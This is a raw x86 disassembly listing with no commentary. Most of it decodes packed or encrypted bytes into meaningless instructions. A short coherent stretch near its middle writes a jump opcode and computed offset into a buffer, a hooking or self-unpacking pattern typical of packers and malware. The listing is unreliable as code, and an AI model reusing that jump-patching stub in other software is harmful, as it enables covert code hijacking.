  41f9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9e8:	rol    dh,cl
  41f9ea:	xchg   ecx,eax
  41f9eb:	or     DWORD PTR [ecx-0x7e],ecx
  41f9ee:	pop    ebp
  41f9ef:	pop    es
  41f9f0:	xchg   ecx,eax
  41f9f1:	pop    edx
  41f9f2:	sbb    al,0xc2
  41f9f4:	es jbe 0x41fa6a
  41f9f7:	push   ebx
  41f9f8:	outs   dx,BYTE PTR ds:[esi]
  41f9f9:	hlt    
  41f9fa:	adc    eax,0x99050c26
  41f9ff:	mov    ecx,0xd75f9479
  41fa04:	in     al,dx
  41fa05:	push   0x67
  41fa07:	xor    cl,bh
  41fa09:	imul   esi,DWORD PTR [ebp+0x5b],0x794c5a93
  41fa10:	xchg   ebx,eax
  41fa11:	dec    eax
  41fa12:	ret    0xe0a4
  41fa15:	jmp    0x41fa06
  41fa17:	out    0xc4,eax
  41fa19:	test   eax,0x9d97a48d
  41fa1e:	or     BYTE PTR [ebp-0x4d697a7b],ah
  41fa24:	jb     0x41fa8c
  41fa26:	inc    eax
  41fa27:	pop    eax
  41fa28:	(bad)  
  41fa2a:	jmp    0xa74bc0a6
  41fa2f:	mov    WORD PTR [edx-0x60],fs
  41fa32:	sub    al,0x83
  41fa34:	mov    al,0xa1
  41fa36:	scas   al,BYTE PTR es:[edi]
  41fa37:	mov    esi,0x75c459fb
  41fa3c:	in     al,dx
  41fa3d:	mov    edi,0xcac618b9
  41fa42:	push   esi
  41fa43:	stos   DWORD PTR es:[edi],eax
  41fa44:	scas   al,BYTE PTR es:[edi]
  41fa45:	push   esp
  41fa46:	fld    QWORD PTR ds:0x22b232cc
  41fa4c:	loop   0x41fa44
  41fa4e:	and    al,0x32
  41fa50:	int3   
  41fa51:	cmp    ah,BYTE PTR [esi+0x75]
  41fa54:	jnp    0x41fa83
  41fa56:	mov    DWORD PTR ds:0x92e5b77d,ebp
  41fa5c:	push   ebp
  41fa5d:	int3   
  41fa5e:	or     esi,DWORD PTR [ecx]
  41fa60:	into   
  41fa61:	sub    DWORD PTR [eax+ecx*1+0x12],esp
  41fa65:	mov    ebp,0x78f91ea6
  41fa6a:	and    al,0x13
  41fa6c:	sub    eax,0xe82b6ec6
  41fa71:	lahf   
  41fa72:	fistp  DWORD PTR [eax]
  41fa74:	ret    0x4696
  41fa77:	ficom  WORD PTR ds:0x2fa4886f
  41fa7d:	xchg   edi,eax
  41fa7e:	mov    cl,0xe8
  41fa80:	mov    ?,ebx
  41fa82:	push   edx
  41fa83:	mov    eax,0x29ce2c0a
  41fa88:	imul   eax,edx,0xa8fc7727
  41fa8e:	or     ecx,0xffffffb4
  41fa91:	repnz push cs
  41fa93:	mov    dl,0x35
  41fa95:	rcl    BYTE PTR [ecx+ebx*4+0x7cb8a2d6],1
  41fa9c:	pusha  
  41fa9d:	rol    ah,0x8d
  41faa0:	(bad)  [eax-0x80]
  41faa3:	push   ebx
  41faa4:	adc    edi,0xfffffff0
  41faa7:	nop
  41faa8:	bound  ecx,QWORD PTR [edi-0x1e95af63]
  41faae:	out    dx,al
  41faaf:	pop    ebp
  41fab0:	xor    ecx,ecx
  41fab2:	pop    es
  41fab3:	iret   
  41fab4:	sbb    eax,0xff4b103c
  41fab9:	lods   al,BYTE PTR ds:[esi]
  41faba:	lahf   
  41fabb:	jo     0x41fa9c
  41fabd:	(bad)  
  41fabe:	add    BYTE PTR [ecx-0xd],0xaf
  41fac2:	jbe    0x41fa9f
  41fac4:	push   cs
  41fac5:	push   ebp
  41fac6:	(bad)  [edx+0x17]
  41fac9:	jno    0x41faeb
  41facb:	mov    ds:0x5992b027,al
  41fad0:	jecxz  0x41fac9
  41fad2:	fiadd  DWORD PTR ds:[ebx]
  41fad5:	rcr    BYTE PTR [edx-0x2b],0x8
  41fad9:	or     bh,dh
  41fadb:	jecxz  0x41fa87
  41fadd:	repnz std 
  41fadf:	iret   
  41fae0:	sub    BYTE PTR [ebx+0x7780a46d],bh
  41fae6:	scas   eax,DWORD PTR es:[edi]
  41fae7:	add    ecx,DWORD PTR [ebp-0x72]
  41faea:	add    ecx,ecx
  41faec:	push   edx
  41faed:	sbb    BYTE PTR [ebx],dl
  41faef:	cmp    eax,0x77bdaf6d
  41faf4:	sub    bh,BYTE PTR [ebp+0x4e129eea]
  41fafa:	(bad)  
  41fafb:	js     0x41faf3
  41fafd:	jo     0x41fb2a
  41faff:	mov    ebp,DWORD PTR [ecx+0x52]
  41fb02:	push   ebp
  41fb03:	xchg   ebp,ebx
  41fb05:	popf   
  41fb06:	cmp    dl,BYTE PTR [eax+0x27]
  41fb09:	xor    eax,DWORD PTR [edx+0x19]
  41fb0c:	scas   al,BYTE PTR es:[edi]
  41fb0d:	rol    DWORD PTR [edx-0x17],0xb5
  41fb11:	(bad)  
  41fb12:	rcr    BYTE PTR [ecx-0x23],1
  41fb15:	xchg   edx,eax
  41fb16:	imul   ah
  41fb18:	icebp  
  41fb19:	adc    al,BYTE PTR [ebx]
  41fb1b:	(bad)  
  41fb1d:	fmul   DWORD PTR [eax]
  41fb1f:	pop    ebx
  41fb20:	out    0x12,eax
  41fb22:	jmp    0x41fb4c
  41fb24:	pop    edx
  41fb25:	inc    ebp
  41fb26:	mov    ecx,0x7118fdb
  41fb2b:	mov    eax,0xa6946c26
  41fb30:	mov    al,BYTE PTR [ebp-0xdece967]
  41fb36:	test   eax,0xfdc145e7
  41fb3b:	mov    eax,DWORD PTR [edx]
  41fb3d:	push   edi
  41fb3e:	and    al,BYTE PTR [ebp+0x3b]
  41fb41:	sub    edx,DWORD PTR [edx+esi*4+0x49a4849e]
  41fb48:	nop
  41fb49:	add    al,0x4f
  41fb4b:	jnp    0x41fb62
  41fb4d:	pop    eax
  41fb4e:	test   bl,bl
  41fb50:	test   ecx,esp
  41fb52:	ja     0x41fb23
  41fb54:	dec    esp
  41fb55:	pop    ebx
  41fb56:	iret   
  41fb57:	add    cl,BYTE PTR [ebp+0x75]
  41fb5a:	xchg   ebx,eax
  41fb5b:	sti    
  41fb5c:	clc    
  41fb5d:	mov    gs,ebx
  41fb5f:	aad    0x4c
  41fb61:	aas    
  41fb62:	neg    DWORD PTR [edx]
  41fb64:	dec    edx
  41fb65:	inc    ebx
  41fb66:	lea    edx,[esi+0x4234a534]
  41fb6c:	or     edx,eax
  41fb6e:	or     BYTE PTR ds:0x47c540b7,0xce
  41fb75:	jge    0x41fb8c
  41fb77:	fidiv  DWORD PTR [edi]
  41fb79:	add    BYTE PTR [edx+0x3c98eec4],dh
  41fb7f:	(bad)  
  41fb80:	push   ecx
  41fb81:	add    DWORD PTR [ebp-0x2],edx
  41fb84:	inc    ebx
  41fb85:	rol    DWORD PTR [edx-0x22],0x59
  41fb89:	aam    0x8e
  41fb8b:	cdq    
  41fb8c:	adc    al,0xa7
  41fb8e:	mov    esi,ecx
  41fb90:	push   ecx
  41fb91:	in     eax,dx
  41fb92:	cli    
  41fb93:	stos   DWORD PTR es:[edi],eax
  41fb94:	aad    0xea
  41fb96:	neg    ah
  41fb98:	sar    cl,cl
  41fb9a:	stos   BYTE PTR es:[edi],al
  41fb9b:	mov    WORD PTR [ebp+0x3b],fs
  41fb9e:	fild   QWORD PTR [eax-0x3]
  41fba1:	mov    dh,0xac
  41fba3:	push   ss
  41fba4:	jo     0x41fbda
  41fba6:	jae    0x41fbf9
  41fba8:	into   
  41fba9:	fwait
  41fbaa:	stos   BYTE PTR es:[edi],al
  41fbab:	aaa    
  41fbac:	inc    edx
  41fbad:	sub    ebp,ebp
  41fbaf:	push   esp
  41fbb0:	outs   dx,DWORD PTR ds:[esi]
  41fbb1:	pop    ebp
  41fbb2:	std    
  41fbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbb4:	dec    edx
  41fbb5:	pushf  
  41fbb6:	pop    eax
  41fbb7:	(bad)  
  41fbb8:	repz cmp BYTE PTR ds:0x30123fdf,0xa6
  41fbc0:	dec    esp
  41fbc1:	(bad)  
  41fbc2:	call   0xe184b9c3
  41fbc7:	enter  0x3228,0xe3
  41fbcb:	dec    ebp
  41fbcc:	int3   
  41fbcd:	sub    ebp,DWORD PTR [eax+0x5b]
  41fbd0:	cmp    edx,ebp
  41fbd2:	inc    esi
  41fbd3:	xlat   BYTE PTR ds:[ebx]
  41fbd4:	adc    al,0x67
  41fbd6:	int    0x27
  41fbd8:	jo     0x41fc4f
  41fbda:	push   0x293ddb1d
  41fbdf:	popa   
  41fbe0:	or     DWORD PTR [esi-0x56fa8ba4],edx
  41fbe6:	sub    DWORD PTR [edx+0x25],0xffffff93
  41fbea:	sahf   
  41fbeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbec:	ss inc ecx
  41fbee:	push   ecx
  41fbef:	pushf  
  41fbf0:	mov    ch,0x9e
  41fbf2:	bound  eax,QWORD PTR [ebx]
  41fbf4:	jns    0x41fc1a
  41fbf6:	shr    DWORD PTR [esi+edx*1-0xded2211],1
  41fbfd:	xchg   edx,eax
  41fbfe:	xchg   esi,eax
  41fbff:	repz cmp eax,0x54a8eb95
  41fc05:	mov    WORD PTR [esi-0x2bcee5ca],cs
  41fc0b:	inc    ebx
  41fc0c:	aas    
  41fc0d:	mov    WORD PTR [ecx],cs
  41fc0f:	mov    eax,ds:0xd3ba6b2e
  41fc14:	xchg   esp,eax
  41fc15:	jmp    0x41fbd1
  41fc17:	inc    eax
  41fc18:	inc    eax
  41fc19:	shl    DWORD PTR [esi-0x394b30fe],0xb
  41fc20:	lods   al,BYTE PTR ds:[esi]
  41fc21:	mov    eax,0x73401086
  41fc26:	cmp    ecx,DWORD PTR [edi]
  41fc28:	cmp    dl,dh
  41fc2a:	cmp    DWORD PTR [esi-0x5b],esp
  41fc2d:	rcl    BYTE PTR [edx+0x2b8720bb],0xfd
  41fc34:	inc    edx
  41fc35:	dec    eax
  41fc36:	xchg   esi,eax
  41fc37:	or     bl,BYTE PTR [edi+edi*2]
  41fc3a:	push   cs
  41fc3b:	out    0xb9,eax
  41fc3d:	sahf   
  41fc3e:	adc    al,0xb4
  41fc40:	pop    ds
  41fc41:	into   
  41fc42:	int    0x8b
  41fc44:	and    DWORD PTR [ebx],esp
  41fc46:	sub    esp,esi
  41fc48:	jns    0x41fc15
  41fc4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc4b:	loope  0x41fc62
  41fc4d:	ficomp DWORD PTR [eax]
  41fc4f:	shl    BYTE PTR [edx],0xfa
  41fc52:	int    0x5a
  41fc54:	jne    0x41fc60
  41fc56:	ins    BYTE PTR es:[edi],dx
  41fc57:	pop    ecx
  41fc58:	fsubr  st(0),st
  41fc5a:	(bad)  
  41fc5b:	xor    esp,DWORD PTR [ebx-0x51]
  41fc5e:	pop    ss
  41fc5f:	int    0x5c
  41fc61:	cld    
  41fc62:	xchg   ebp,eax
  41fc63:	xchg   DWORD PTR [edx-0x72],edx
  41fc66:	or     al,0x11
  41fc68:	fidiv  WORD PTR ds:0xfac10492
  41fc6e:	inc    edi
  41fc6f:	xchg   ecx,eax
  41fc70:	sahf   
  41fc71:	jle    0x41fcf2
  41fc73:	adc    BYTE PTR [eax+0x23dfc9f9],0xe
  41fc7a:	fnsave [edx]
  41fc7c:	outs   dx,DWORD PTR ds:[esi]
  41fc7d:	push   0xffffffb4
  41fc7f:	and    eax,DWORD PTR ds:0x3349a0e0
  41fc85:	mov    BYTE PTR [ebx],0xc7
  41fc88:	push   eax
  41fc89:	mov    eax,DWORD PTR [ebp-0x24]
  41fc8c:	add    eax,0xaa
  41fc91:	push   eax
  41fc92:	mov    eax,DWORD PTR [ebp-0x24]
  41fc95:	mov    eax,DWORD PTR [eax+0x198]
  41fc9b:	push   DWORD PTR [eax]
  41fc9d:	call   0x423732
  41fca2:	mov    DWORD PTR [ebp-0x14],eax
  41fca5:	lea    eax,[ebp+0x4]
  41fca8:	mov    DWORD PTR [ebp-0x30],eax
  41fcab:	mov    eax,DWORD PTR [ebp-0x14]
  41fcae:	test   eax,eax
  41fcb0:	je     0x422078
  41fcb6:	lea    eax,[ebp-0x8]
  41fcb9:	mov    DWORD PTR [ebp-0x38],eax
  41fcbc:	mov    eax,DWORD PTR [ebp-0x34]
  41fcbf:	mov    DWORD PTR [ebp-0x8],eax
  41fcc2:	mov    eax,DWORD PTR [ebp-0x8]
  41fcc5:	mov    ecx,DWORD PTR [ebp-0x14]
  41fcc8:	sub    eax,ecx
  41fcca:	mov    DWORD PTR [ebp-0x8],eax
  41fccd:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd0:	xor    ecx,esi
  41fcd2:	mov    eax,0xffcd8d14
  41fcd7:	sub    eax,ecx
  41fcd9:	add    DWORD PTR [ebp-0x8],eax
  41fcdc:	mov    eax,DWORD PTR [ebp-0x8]
  41fcdf:	mov    ecx,DWORD PTR [ebp-0x14]
  41fce2:	mov    DWORD PTR [ecx+0x1],eax
  41fce5:	mov    eax,DWORD PTR [ebp-0x14]
  41fce8:	push   DWORD PTR [ebp-0x24]
  41fceb:	mov    BYTE PTR [eax],0xe9
  41fcee:	mov    eax,ds:0x42816b
  41fcf3:	push   DWORD PTR [eax]
  41fcf5:	push   DWORD PTR ds:0x4283c7
  41fcfb:	push   DWORD PTR ds:0x428173
  41fd01:	jmp    0x422061
  41fd06:	inc    edi
  41fd07:	cmp    esi,0x5e
  41fd0a:	mov    dh,0x3
  41fd0c:	(bad)  
  41fd0d:	jnp    0x41fce7
  41fd0f:	sub    DWORD PTR [esi],ebx
  41fd11:	jmp    0x41fd49
  41fd13:	popa   
  41fd14:	jp     0x41fcff
  41fd16:	out    dx,eax
  41fd17:	test   eax,0x5f3f7a7d
  41fd1c:	jp     0x41fd98
  41fd1e:	retf   0xf7f1
  41fd21:	imul   ebp,esp,0xf9d9e2aa
  41fd27:	ficomp WORD PTR [ebx-0x1b7ab4c8]
  41fd2d:	icebp  
  41fd2e:	xor    al,0x8f
  41fd30:	ret    
  41fd31:	iret   
  41fd32:	ins    DWORD PTR es:[edi],dx
  41fd33:	cli    
  41fd34:	arpl   WORD PTR ss:[eax+0x69b9e4cf],cx
  41fd3b:	jmp    0x9439:0x84d00b4e
  41fd42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd43:	adc    dh,bl
  41fd45:	inc    esi
  41fd46:	push   esi
  41fd47:	xchg   esi,eax
  41fd48:	and    BYTE PTR [ebx+0x71bb3baa],cl
  41fd4e:	ror    DWORD PTR [ebx+esi*2],cl
  41fd51:	jg     0x41fd8c
  41fd53:	add    al,0x38
  41fd55:	jns    0x41fd37
  41fd57:	scas   eax,DWORD PTR es:[edi]
  41fd58:	ss out 0x7,eax
  41fd5b:	and    bl,BYTE PTR [eax-0x29246c3f]
  41fd61:	sbb    DWORD PTR [eax+0x7180beb2],0x2916543a
  41fd6b:	mov    edi,0x9975b60e
  41fd70:	int3   
  41fd71:	sbb    BYTE PTR [eax+0x4e],cl
  41fd74:	sub    ch,cl
  41fd76:	xchg   esp,eax
  41fd77:	xor    BYTE PTR [ebx-0x60],0x12
  41fd7b:	pop    ebx
  41fd7c:	fild   QWORD PTR [ebp-0x5fa1dbe]
  41fd82:	jge    0x41fd59
  41fd84:	pop    ds
  41fd85:	cwde   
  41fd86:	dec    ebx
  41fd87:	jno    0x41fd92
  41fd89:	(bad)  
  41fd8a:	mov    edi,0xb2c4db4a
  41fd8f:	sbb    al,0x54
  41fd91:	fcom   QWORD PTR [esi-0xf]
  41fd94:	fstp   QWORD PTR [esi]
  41fd96:	mov    dh,0x56
  41fd98:	xor    BYTE PTR [edx-0x66],ch
  41fd9b:	dec    ecx
  41fd9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd9d:	inc    ebp
  41fd9e:	bound  esi,QWORD PTR [esi+0x7e]
  41fda1:	xchg   ebx,eax
  41fda2:	add    al,0xec
  41fda4:	sbb    ch,al
  41fda6:	sub    ebx,DWORD PTR [edi]
  41fda8:	xchg   DWORD PTR [edx],ebx
  41fdaa:	loopne 0x41fdaa
  41fdac:	shl    DWORD PTR fs:[ecx],0x99
  41fdb0:	push   esi
  41fdb1:	hlt    
  41fdb2:	fst    DWORD PTR [ebp+esi*1-0x3e72c00c]
  41fdb9:	xor    cl,al
  41fdbb:	es pushf 
  41fdbd:	lods   eax,DWORD PTR ds:[esi]
  41fdbe:	cmp    bl,BYTE PTR [eax+0x7f]
  41fdc1:	xor    al,0xf0
  41fdc3:	push   0x25
  41fdc5:	leave  
  41fdc6:	dec    eax
  41fdc7:	and    dl,0xf2
  41fdca:	inc    BYTE PTR [esi]
  41fdcc:	in     eax,dx
  41fdcd:	(bad)  
  41fdce:	enter  0xfe30,0xe6
  41fdd2:	dec    esi
  41fdd3:	(bad)  
  41fdd4:	stc    
  41fdd5:	xor    al,0x88
  41fdd7:	mov    ds:0xa1b38c39,eax
  41fddc:	mov    bh,0x84
  41fdde:	xor    al,0xa4
  41fde0:	cmp    BYTE PTR [ebx-0x23],0x66
  41fde4:	test   al,0x9b
  41fde6:	jp     0x41fd8a
  41fde8:	jcxz   0x41fe1f
  41fdeb:	std    
  41fdec:	inc    edx
  41fded:	dec    ebp
  41fdee:	ds cmc 
  41fdf0:	icebp  
  41fdf1:	(bad)  
  41fdf2:	cmc    
  41fdf3:	mov    esp,0x33a5efde
  41fdf8:	pop    esp
  41fdf9:	mov    dl,0xf
  41fdfb:	mov    dh,0xa2
  41fdfd:	jge    0x41fe45
  41fdff:	push   es
  41fe00:	and    dh,bl
  41fe02:	ds push es
  41fe04:	or     DWORD PTR [esi+eiz*8],esi
  41fe07:	push   ss
  41fe08:	push   esp
  41fe09:	jae    0x41fe1c
  41fe0b:	data16 jns 0x41fe05
  41fe0e:	fcomip st,st(5)
  41fe10:	call   0x5090:0x8c098534
  41fe17:	int    0x2b
  41fe19:	cs addr16 out 0xd2,al
  41fe1d:	push   0x53
  41fe1f:	retf   
  41fe20:	cmp    DWORD PTR [esi],0xffffffd7
  41fe23:	cmp    eax,0x9e895753
  41fe28:	cmp    BYTE PTR [esi],0x1e
  41fe2b:	cld    
  41fe2c:	sti    
  41fe2d:	in     eax,dx
  41fe2e:	test   DWORD PTR [ecx-0x8],ebx
  41fe31:	jnp    0x41fe02
  41fe33:	push   ss
  41fe34:	pop    es
  41fe35:	add    BYTE PTR [edi],0x88
  41fe38:	ja     0x41fdc4
  41fe3a:	and    dl,BYTE PTR [esi]
  41fe3c:	rcl    DWORD PTR [edi],0x1c
  41fe3f:	fstp   DWORD PTR [ecx+0x1d]
  41fe42:	add    BYTE PTR [esi+0x29],bl
  41fe45:	in     eax,0xf0
  41fe47:	jl     0x41fdcb
  41fe49:	scas   eax,DWORD PTR es:[edi]
  41fe4a:	or     ebx,ecx
  41fe4c:	push   edx
  41fe4d:	outs   dx,BYTE PTR ds:[esi]
  41fe4e:	sbb    BYTE PTR [ecx+0x75043ada],cl
  41fe54:	lods   al,BYTE PTR ds:[esi]
  41fe55:	icebp  
  41fe56:	test   BYTE PTR [edi-0x50],0x1d
  41fe5a:	(bad)  
  41fe5b:	adc    bh,BYTE PTR [esi+0xa110720]
  41fe61:	lahf   
  41fe62:	mov    WORD PTR [ebx],cs
  41fe64:	icebp  
  41fe65:	fdivr  DWORD PTR [ecx]
  41fe67:	xchg   esi,eax
  41fe68:	aas    
  41fe69:	mov    fs:0x9d0a6dc8,eax
  41fe6f:	mov    cl,0xe2
  41fe71:	add    BYTE PTR [esi-0x1d],ch
  41fe74:	xor    BYTE PTR [eax+0x49],ch
  41fe77:	cmp    al,0x3f
  41fe79:	sbb    BYTE PTR [edx+0x34],bh
  41fe7c:	pop    edi
  41fe7d:	std    
  41fe7e:	repnz mul DWORD PTR [edx-0x5b]
  41fe82:	fnstsw WORD PTR [edx+0x19]
  41fe85:	out    dx,eax
  41fe86:	cmc    
  41fe87:	in     al,0x56
  41fe89:	sbb    ebx,DWORD PTR [eax]
  41fe8b:	cli    
  41fe8c:	cmp    eax,0x1f62136f
  41fe91:	and    edi,ebp
  41fe93:	(bad)  
  41fe95:	push   eax
  41fe96:	ins    DWORD PTR es:[edi],dx
  41fe97:	and    bl,BYTE PTR fs:[ebp-0x78]
  41fe9b:	clc    
  41fe9c:	rcl    DWORD PTR [ecx],0xed
  41fe9f:	add    eax,esp
  41fea1:	int3   
  41fea2:	cmp    al,0xf4
  41fea4:	out    dx,al
  41fea5:	(bad)  
  41fea6:	sub    ah,bl
  41fea8:	dec    esp
  41fea9:	in     al,0x89
  41feab:	ret    0xc4f3
  41feae:	ins    BYTE PTR es:[edi],dx
  41feaf:	ins    DWORD PTR es:[edi],dx
  41feb0:	pop    esp
  41feb1:	mov    gs,ebp
  41feb3:	int3   
  41feb4:	push   cs
  41feb5:	mov    bl,0x81
  41feb7:	push   0x78cffa52
  41febc:	pop    ebp
  41febd:	xchg   esp,eax
  41febe:	sbb    al,0x5d
  41fec0:	shl    ch,1
  41fec2:	lahf   
  41fec3:	mov    WORD PTR [ecx-0x73],?
  41fec6:	mov    ebx,DWORD PTR [esi+ecx*2+0x83c7e45]
  41fecd:	and    al,0xf2
  41fecf:	arpl   cx,dx
  41fed1:	inc    esp
  41fed2:	std    
  41fed3:	push   ebx
  41fed4:	fcom   st(3)
  41fed6:	xchg   ebx,eax
  41fed7:	call   0xcd7e:0xcda99f3
  41fede:	xchg   BYTE PTR [esi],bh
  41fee0:	stc    
  41fee1:	cmp    cl,ch
  41fee3:	fcmovbe st,st(7)
  41fee5:	dec    edi
  41fee6:	in     eax,0x30
  41fee8:	or     DWORD PTR [edx+0x10],eax
  41feeb:	adc    DWORD PTR [edx+0x7b],0x15162430
  41fef2:	lods   eax,DWORD PTR ds:[esi]
  41fef3:	fwait
  41fef4:	pop    eax
  41fef5:	fs mov bl,0xbf
  41fef8:	xchg   DWORD PTR [ebp+0x44901f50],esp
  41fefe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41feff:	sbb    cl,BYTE PTR [eax-0x5ee4c7ce]
  41ff05:	push   0xffffffc5
  41ff07:	loopne 0x41ff08
  41ff09:	and    ebp,DWORD PTR [edx+eiz*8]
  41ff0c:	jmp    0x3ec7c013
  41ff11:	in     eax,0xed
  41ff13:	or     esp,ecx
  41ff15:	stc    
  41ff16:	loope  0x41fec5
  41ff18:	xchg   esp,eax
  41ff19:	jl     0x41feae
  41ff1b:	push   0x26
  41ff1d:	adc    eax,0x62df4adf
  41ff22:	dec    esp
  41ff23:	aaa    
  41ff24:	icebp  
  41ff25:	xor    esi,DWORD PTR [edx-0x568c7071]
  41ff2b:	mov    ?,WORD PTR [ebx+0x4b]
  41ff2e:	xor    edx,DWORD PTR [edi+ecx*4]
  41ff31:	xor    esp,edi
  41ff33:	pop    ebx
  41ff34:	mov    bh,0xdc
  41ff36:	push   ecx
  41ff37:	mov    al,0x81
  41ff39:	xchg   DWORD PTR [ebp+0x5b99badc],ebp
  41ff3f:	add    edi,DWORD PTR [esi+0x18]
  41ff42:	hlt    
  41ff43:	test   DWORD PTR [edi],edi
  41ff45:	nop
  41ff46:	data16 add al,0x42
  41ff49:	js     0x41ff39
  41ff4b:	mov    dl,BYTE PTR [esi+ebp*4]
  41ff4e:	call   0xb765:0x2bd1f296
  41ff55:	and    eax,0x156fdbb5
  41ff5a:	push   ecx
  41ff5b:	popf   
  41ff5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff5d:	inc    esi
  41ff5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff5f:	es lock ds jge 0x41ffa4
  41ff64:	push   ebp
  41ff65:	bound  ecx,QWORD PTR ds:[edi-0x6a]
  41ff69:	sbb    ch,BYTE PTR [ebx]
  41ff6b:	xlat   BYTE PTR ds:[ebx]
  41ff6c:	ror    al,1
  41ff6e:	dec    edx
  41ff6f:	lods   eax,DWORD PTR ds:[esi]
  41ff70:	cmp    DWORD PTR [ecx+esi*2+0x7a],ecx
  41ff74:	cmp    eax,0xfc0216c7
  41ff79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff7a:	loope  0x41ffca
  41ff7c:	scas   eax,DWORD PTR es:[edi]
  41ff7d:	or     ch,bh
  41ff7f:	ss hlt 
  41ff81:	pop    esi
  41ff82:	dec    ebp
  41ff83:	mov    al,0x68
  41ff85:	inc    ebp
  41ff86:	stos   BYTE PTR es:[edi],al
  41ff87:	ja     0x41ffb6
  41ff89:	ins    BYTE PTR es:[edi],dx
  41ff8a:	frstor [ebx+0x37]
  41ff8d:	in     eax,dx
  41ff8e:	jl     0x41ff38
  41ff90:	sub    eax,0x30f9df0a
  41ff95:	aam    0xb0
  41ff97:	cld    
  41ff98:	sahf   
  41ff99:	adc    DWORD PTR [ecx+esi*1-0x1983b55a],ebp
  41ffa0:	aas    
  41ffa1:	leave  
  41ffa2:	inc    DWORD PTR [eax+eiz*2]
  41ffa5:	pop    esi
  41ffa6:	mov    al,0x29
  41ffa8:	inc    ecx
  41ffa9:	(bad)  
  41ffaa:	iret   
  41ffab:	dec    esp
  41ffac:	jp     0x41fff4
  41ffae:	inc    esp
  41ffaf:	je     0x420020
  41ffb1:	pop    esi
  41ffb2:	in     eax,0x42
  41ffb4:	lock dec ebp
  41ffb6:	sub    eax,0x31579c3e
  41ffbb:	pop    DWORD PTR [esi+0x65c186d6]
  41ffc1:	retf   
  41ffc2:	mov    eax,0x17d6b24c
  41ffc7:	scas   eax,DWORD PTR es:[edi]
  41ffc8:	pop    ebx
  41ffc9:	mov    bh,0x97
  41ffcb:	push   esp
  41ffcc:	fdiv   QWORD PTR [edx-0x749f54f1]
  41ffd2:	pop    ecx
  41ffd3:	lds    edi,FWORD PTR [esi-0x1c]
  41ffd6:	ins    BYTE PTR es:[edi],dx
  41ffd7:	je     0x41ffb9
  41ffd9:	ret    0x85f1
  41ffdc:	pop    edi
  41ffdd:	mov    edx,0x66c1d1ff
  41ffe2:	loopne 0x42001a
  41ffe4:	and    ah,cl
  41ffe6:	jae    0x41ff88
  41ffe8:	mov    eax,ds:0x9b2f7763
  41ffed:	repz mov dh,0x57
  41fff0:	cmp    BYTE PTR [ecx+0x66],al
  41fff3:	call   FWORD PTR [ebx+0x4d]
  41fff6:	js     0x42002b
  41fff8:	jo     0x42001a
  41fffa:	pcmpeqb mm2,QWORD PTR [ebx]
  41fffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fffe:	(bad)  
  41ffff:	sti    
  420000:	or     dl,ah
  420002:	rcl    BYTE PTR [ecx],0x42
  420005:	xor    esp,esi
  420007:	pop    esi
  420008:	add    BYTE PTR [ebp-0x4b],ch
  42000b:	imul   edx,DWORD PTR [esp+eiz*4+0x4e],0xf8b19753
  420013:	pop    esi
  420014:	mov    bl,0x1d
  420016:	fbld   TBYTE PTR [ebx]
  420018:	fidivr WORD PTR [ebx+edi*4+0x3]
  42001c:	push   es
  42001d:	push   ebp
  42001e:	(bad)  
  42001f:	jge    0x420079
  420021:	xor    ch,BYTE PTR [edx-0x49927e77]
  420027:	hlt    
  420028:	dec    eax
  420029:	mov    bh,BYTE PTR [edi-0x74]
  42002c:	lahf   
  42002d:	mov    WORD PTR [ecx+eax*1],?
  420030:	jno    0x42001b
  420032:	sahf   
  420033:	ret    0x4b24
  420036:	outs   dx,BYTE PTR ds:[esi]
  420037:	inc    ebx
  420038:	mov    bh,0x17
  42003a:	sub    cl,cl
  42003c:	sbb    DWORD PTR [ebp-0x12a20e4d],ebp
  420042:	fcom   DWORD PTR [ecx+0x49a966be]
  420048:	call   0x4e71:0x43e9e20e
  42004f:	dec    ecx
  420050:	(bad)
  420053:	mov    al,0xfa
  420055:	cmp    eax,0x38089672
  42005a:	and    edx,DWORD PTR [eax-0x20]
  42005d:	scas   eax,DWORD PTR es:[edi]
  42005e:	xchg   esp,eax
  42005f:	sub    cl,BYTE PTR [ebp+0x48]
  420062:	jmp    0x420004
  420064:	sbb    eax,0x51e7e8cc
  420069:	and    BYTE PTR [eax-0x14],ah
  42006c:	loopne 0x4200b4
  42006e:	adc    edx,DWORD PTR [edx-0x1095693]
  420074:	loopne 0x42008b
  420076:	nop
  420077:	sbb    ecx,0xc1394837
  42007d:	mov    ch,0x7a
  42007f:	loope  0x4200ad
  420081:	xor    eax,0xbe4de4c4
  420086:	(bad)  
  420087:	mov    bl,0xf9
  420089:	outs   dx,DWORD PTR ds:[esi]
  42008a:	push   esp
  42008b:	test   DWORD PTR [ebp-0x2693191f],ecx
  420091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420092:	mov    al,ds:0x38e52363
  420097:	aas    
  420098:	iret   
  420099:	mov    ebx,0xfa7c23fc
  42009e:	add    eax,0x589b9771
  4200a3:	lahf   
  4200a4:	lds    ecx,FWORD PTR [ebx]
  4200a6:	and    DWORD PTR [esi-0x7acf143c],eax
  4200ac:	and    dl,BYTE PTR [esi-0x5704e37a]
  4200b2:	js     0x42005c
  4200b4:	call   0x8e821427
  4200b9:	mov    edx,0xfe3df8c6
  4200be:	out    0x81,eax
  4200c0:	jmp    0xbd8d:0x2b09f1a0
  4200c7:	sbb    al,0xae
  4200c9:	jmp    0x420130
  4200cb:	xchg   BYTE PTR [edi],ah
  4200cd:	ds cmp DWORD PTR fs:[ecx],0x2e
  4200d2:	mov    dh,0x91
  4200d4:	or     BYTE PTR [ecx],cl
  4200d6:	lock push edi
  4200d8:	push   edx
  4200d9:	shl    ebp,cl
  4200db:	(bad)  
  4200dc:	fst    QWORD PTR [eax+eiz*1]
  4200df:	inc    esp
  4200e0:	jno    0x42006f
  4200e2:	inc    ebp
  4200e3:	das    
  4200e4:	mov    bh,0x27
